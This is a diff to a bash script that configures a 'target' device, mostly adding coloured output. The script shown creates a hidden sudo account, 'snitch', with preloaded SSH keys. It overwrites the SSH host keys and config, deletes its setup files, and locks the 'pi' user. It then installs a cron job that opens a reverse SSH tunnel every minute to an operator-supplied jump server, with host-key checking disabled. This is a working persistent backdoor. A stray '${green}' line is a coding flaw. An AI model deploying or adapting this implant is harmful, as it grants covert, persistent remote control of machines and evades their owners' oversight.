@@ -1,18 +1,23 @@
 #!/bin/bash
 
+
+red=`tput setaf 1`
+green=`tput setaf 2`
+reset=`tput sgr0`
+
 if [ $# -eq 0 ]
 then
-echo "Pass this script your jump server ip address so it can persist the connection"
+echo "${red} Pass this script your jump server ip address so it can persist the connection${reset}"
 exit 1
 fi
 
 # Check that user has root access
 if (( $EUID != 0 ))
 then
-  echo "You must run target_config.sh as root"
+  echo "${red} You must run target_config.sh as root${reset}"
   exit 1
 fi
-
+${green}
 export LANGUAGE=en_US.UTF-8
 export LANG=en_US.UTF-8
 export LC_ALL=en_US.UTF-8
@@ -31,21 +36,21 @@ sudo apt upgrade -y
 cd $(dirname $0)
 
 # Create a non-root user for the target server
-echo "creating snitch account on this machine"
+echo "${green} creating snitch account on this machine${reset}"
 mkdir /home/snitch
 mkdir /home/snitch/.ssh
 useradd snitch -d /home/snitch
 # Set snitch password
-echo "Set a password for snitch"
+echo "${green} Set a password for snitch${reset}"
 passwd snitch
 # Authorize home to login
-echo "Setting snitch account rules"
+echo "${green} Setting snitch account rules${reset}"
 cat ./server-auth/authorized_keys > /home/snitch/.ssh/authorized_keys
 chmod 644 /home/snitch/.ssh/authorized_keys
 cat ./known/known_hosts > /home/snitch/.ssh/known_hosts
 chmod 644 /home/snitch/.ssh/known_hosts
 # Set public and private keys and their permissions
-echo "Writing ssh keys"
+echo "${green} Writing ssh keys${reset}"
 cat ./client-key/id_rsa > /home/snitch/.ssh/id_rsa
 chmod 600 /home/snitch/.ssh/id_rsa
 cat ./client-key/id_rsa.pub > /home/snitch/.ssh/id_rsa.pub
@@ -59,7 +64,7 @@ usermod -aG sudo snitch
 
 
 # Configure ssh server keys and universal settings
-echo "Setting universal ssh rules and server keys"
+echo "${green} Setting universal ssh rules and server keys${reset}"
 mkdir /etc/ssh
 cat ./server-key/ssh_host_ecdsa_key > /etc/ssh/ssh_host_ecdsa_key
 chmod 600 /etc/ssh/ssh_host_ecdsa_key
@@ -71,20 +76,20 @@ cat ./server-config/sshd_config > /etc/ssh/sshd_config
 chmod 644 /etc/ssh/sshd_config
 
 # Remove setup files
-echo "Cleaning Up"
+echo "${green} Cleaning Up"
 cd ..
 rm -rf target
 usermod -L pi
 
 # Persistent Callback
-echo "Persisting Callback"
-line="* * * * * ssh -R $1:21285:127.0.0.1:22 dummy@$1 -p 22 -N -o \"StrictHostKeyChecking no\" "
+echo "${green} Persisting Callback${reset}"
+line="* * * * * ssh -R $1:10909:127.0.0.1:22 dummy@$1 -p 22 -N -o \"StrictHostKeyChecking no\" "
 (crontab -u snitch -l; echo "$line") | crontab -u snitch -
 
-echo ".............."
-echo ".............."
-echo ".... Done ...."
-echo ".............."
-echo ".............."
+echo "${green} ..............${reset}"
+echo "${green} ..............${reset}"
+echo "${green} .... DONE ....${reset}"
+echo "${green} ..............${reset}"
+echo "${green} ..............${reset}"
 
 reboot
